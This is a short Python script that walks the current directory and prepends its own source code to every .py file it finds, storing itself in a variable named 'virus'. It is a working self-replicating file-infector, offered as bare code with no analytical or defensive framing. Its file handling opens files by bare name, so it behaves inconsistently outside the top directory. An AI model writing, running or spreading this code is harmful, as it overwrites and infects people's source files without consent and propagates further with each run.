
import os
for root, dirs, files in os.walk(os.getcwd()):
    for f in files:
        if f.endswith('.py'):
            print('.\\' +f, __file__)
            with open(f, 'r+') as f:
                target_host_content = f.read()
                f.seek(0, 0)
                with open(__file__) as virus:
                    virus_content = virus.read()
                    f.write(virus_content + "\n" + target_host_content)